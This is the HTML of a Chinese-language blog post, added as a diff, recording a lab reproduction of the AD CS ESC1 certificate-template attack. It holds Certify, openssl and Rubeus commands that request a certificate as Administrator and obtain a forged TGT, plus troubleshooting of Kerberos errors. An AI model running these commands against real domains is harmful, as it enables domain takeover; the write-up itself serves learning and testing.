@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="环境搭建直接参考这篇文章 建议将adcs服务装到另一台服务器上，安装步骤和方法都和参考文章里一样 利用条件利用条件 颁发CA授予低权限用户请求权限（默认） 模板中CA管理员审批未启用（默认） 模板中不需要授权的签名（默认） 模板允许低权限用户注册 模板定义了启用认证的EKU 证书模板允许请求者在CSR中指定一个SAN  前三个默认的就不看了，分析下后面三个需要设置的条件 模板允许低权限用户注册，这">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ADCS1漏洞踩坑和思考">
+<meta property="og:url" content="http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/index.html">
+<meta property="og:site_name" content="5gstudent&#39;s blog">
+<meta property="og:description" content="环境搭建直接参考这篇文章 建议将adcs服务装到另一台服务器上，安装步骤和方法都和参考文章里一样 利用条件利用条件 颁发CA授予低权限用户请求权限（默认） 模板中CA管理员审批未启用（默认） 模板中不需要授权的签名（默认） 模板允许低权限用户注册 模板定义了启用认证的EKU 证书模板允许请求者在CSR中指定一个SAN  前三个默认的就不看了，分析下后面三个需要设置的条件 模板允许低权限用户注册，这">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_image-20231124171726370.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_image-20231124171802637.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_image-20231124171953177.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_image-20231124095838482.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_image-20231124104634861.png">
+<meta property="article:published_time" content="2023-11-24T16:32:32.000Z">
+<meta property="article:modified_time" content="2023-11-24T16:34:27.501Z">
+<meta property="article:author" content="5gstudent">
+<meta property="article:tag" content="域提权">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_image-20231124171726370.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ADCS1漏洞踩坑和思考</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/5gstudent">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/11/16/%E5%88%A9%E7%94%A8EXCEL%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&text=ADCS1漏洞踩坑和思考"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&title=ADCS1漏洞踩坑和思考"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&is_video=false&description=ADCS1漏洞踩坑和思考"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ADCS1漏洞踩坑和思考&body=Check out this article: http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&title=ADCS1漏洞踩坑和思考"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&title=ADCS1漏洞踩坑和思考"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&title=ADCS1漏洞踩坑和思考"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&title=ADCS1漏洞踩坑和思考"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&name=ADCS1漏洞踩坑和思考&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&t=ADCS1漏洞踩坑和思考"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">利用条件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">2.0.1.</span> <span class="toc-text">利用条件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KDC-ERR-PADATA-TYPE-NOSUPP"><span class="toc-number">3.1.</span> <span class="toc-text">KDC_ERR_PADATA_TYPE_NOSUPP</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ADCS1漏洞踩坑和思考
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">5gstudent</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-11-24T16:32:32.000Z" class="dt-published" itemprop="datePublished">2023-11-25</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%9F%9F%E6%8F%90%E6%9D%83/">域提权</a> › <a class="category-link" href="/categories/%E5%9F%9F%E6%8F%90%E6%9D%83/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>, <a class="p-category" href="/tags/%E5%9F%9F%E6%8F%90%E6%9D%83/" rel="tag">域提权</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接参考这篇<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1583">文章</a></p>
+<p>建议将adcs服务装到另一台服务器上，安装步骤和方法都和参考文章里一样</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>颁发CA授予低权限用户请求权限（默认）</li>
+<li>模板中CA管理员审批未启用（默认）</li>
+<li>模板中不需要授权的签名（默认）</li>
+<li>模板允许低权限用户注册</li>
+<li>模板定义了启用认证的EKU</li>
+<li>证书模板允许请求者在CSR中指定一个SAN</li>
+</ul>
+<p>前三个默认的就不看了，分析下后面三个需要设置的条件</p>
+<p><strong>模板允许低权限用户注册</strong>，这个条件是用作抵权限用户能申请证书的</p>
+<p><img src="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_image-20231124171726370.png" alt="image-20231124171726370"></p>
+<p><strong>模板定义了启用认证的EKU</strong>，关于EKU的解释：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在Windows域中，EKU（Extended Key Usage）是一个X.509 v3证书扩展，它定义了证书的一个或多个用途。例如，某些证书可能仅限于用于服务器身份验证，而其他证书可能仅限于用于客户端身份验证。</span><br><span class="line"></span><br><span class="line">EKU是通过对象标识符（OID）来指定的，每个OID代表一个特定的用途。例如，服务器身份验证的OID是1.3.6.1.5.5.7.3.1，客户端身份验证的OID是1.3.6.1.5.5.7.3.2。</span><br><span class="line"></span><br><span class="line">在Windows域环境中，EKU可以用于限制证书的使用，增强安全性。例如，如果一个证书的EKU仅限于服务器身份验证，那么尝试使用该证书进行客户端身份验证的操作将会失败。</span><br></pre></td></tr></table></figure>
+
+<p>以下 oid 的添加才可以让证书用于 Kerberos 身份认证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">描述								OID</span><br><span class="line">Client Authentication			1.3.6.1.5.5.7.3.2</span><br><span class="line">PKINIT Client Authentication	1.3.6.1.5.2.3.4</span><br><span class="line">Smart Card Logon				1.3.6.1.4.1.311.20.2.2</span><br><span class="line">Any Purpose						2.5.29.37.0</span><br><span class="line">SubCA							(no EKUs)</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_image-20231124171802637.png" alt="image-20231124171802637" style="zoom:80%;" />
+
+<p><strong>证书模板允许请求者在CSR中指定一个SAN：</strong>证书模板允许证书请求者在证书签名请求（CSR，Certificate Signing Request）中指定一个主题备用名称（SAN，Subject Alternative Name）。SAN是一个扩展字段，可以用来指定证书适用的多个主机名，比如多个不同的域名或IP地址。</p>
+<p><img src="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_image-20231124171953177.png" alt="image-20231124171953177"></p>
+<p>满足上面条件时，当攻击者在请求证书时可以通过</p>
+<p>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT字段来声明自己的身份，从而获取到伪造身份的证书。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>复现步骤也参考上面的<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1583">文章</a>，我只记录了复现过程中遇到的问题</p>
+<p>先查找有漏洞的模板</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find /vulnerable</span><br></pre></td></tr></table></figure>
+
+<p>利用工具Certify获取证书</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe request /ca:adcs.adlab1.local\adlab1-ADCS-CA /template:MATRIX /altname:Administrator</span><br></pre></td></tr></table></figure>
+
+<p>对证书内容进行转换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx  </span><br></pre></td></tr></table></figure>
+
+<p>利用转换后的cert.pfx请求TGT</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /dc:10.10.10.4 /ptt</span><br></pre></td></tr></table></figure>
+
+<p>出现报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[!] Unhandled Rubeus exception:</span><br><span class="line">System.Security.Cryptography.CryptographicException: 指定的网络密码不正确。</span><br></pre></td></tr></table></figure>
+
+<p>原因出在openssl对证书转换处，添加一个参数<code>-legacy</code> 即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx -legacy </span><br></pre></td></tr></table></figure>
+
+<p>网上关于参数<code>-legacy</code> 的解释：需要兼容老版本，在使用 OpenSSL 3 版本的 <code>pkcs12</code> 命令时，需要加入 <code>-legacy</code> 选项</p>
+<p>将生成的证书重新申请TGT</p>
+<p>出现报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_image-20231124095838482.png" alt="image-20231124095838482"></p>
+<p>网上给出的方法是改域控的设置（这在真实环境中岂不是G了）</p>
+<p>在请求TGT的对应域控的组策略设置按照下图中位置全部选上，然后重启或者用命令<code>gpupdate</code>更新组策略</p>
+<p><img src="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_image-20231124104634861.png" alt="image-20231124104634861"></p>
+<p>此时再去申请TGT就没有问题了，申请完你的机器里就有了伪造的Administrator的TGT票据，可以直接DCSYNC或者做其他操作</p>
+<h3 id="KDC-ERR-PADATA-TYPE-NOSUPP"><a href="#KDC-ERR-PADATA-TYPE-NOSUPP" class="headerlink" title="KDC_ERR_PADATA_TYPE_NOSUPP"></a>KDC_ERR_PADATA_TYPE_NOSUPP</h3><p>报错<code>[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP</code>只能改域控设置吗？具体原因是什么？</p>
+<p>去搜了下这个报错，找到一些内容</p>
+<ol>
+<li><p>一般对于这个报错的解释：<strong>KDC没有设置Kerberos认证</strong></p>
+</li>
+<li><p>github上有一个关于这个报错的<a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy/issues/64">讨论</a></p>
+</li>
+<li><p>另一个解释：来自他们容器的所有证书同样会作为组策略处理的一部分传播到每个网络连通的客户端，当同步出现问题的话 KDC 认证会抛 <code>KDC_ERR_PADATA_TYPE_NOSUPP</code> 报错</p>
+</li>
+<li><p>该错误通常出现在未将域控制器身份验证证书导入域控制器时，解决方法<a target="_blank" rel="noopener" href="https://support.citrix.com/article/CTX218941/fas-request-not-supported-while-launching-a-published-desktop-with-fas">链接</a>。</p>
+</li>
+</ol>
+<p>通过我的尝试第四种解释和方法是奏效的，在真实环境中这种情况如何呢？</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/5gstudent">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">利用条件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">2.0.1.</span> <span class="toc-text">利用条件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KDC-ERR-PADATA-TYPE-NOSUPP"><span class="toc-number">3.1.</span> <span class="toc-text">KDC_ERR_PADATA_TYPE_NOSUPP</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&text=ADCS1漏洞踩坑和思考"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&title=ADCS1漏洞踩坑和思考"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&is_video=false&description=ADCS1漏洞踩坑和思考"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ADCS1漏洞踩坑和思考&body=Check out this article: http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&title=ADCS1漏洞踩坑和思考"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&title=ADCS1漏洞踩坑和思考"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&title=ADCS1漏洞踩坑和思考"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&title=ADCS1漏洞踩坑和思考"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&name=ADCS1漏洞踩坑和思考&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://5gstudent.github.io/2023/11/25/ADCS1%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E5%92%8C%E6%80%9D%E8%80%83/&t=ADCS1漏洞踩坑和思考"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    5gstudent
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/5gstudent">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
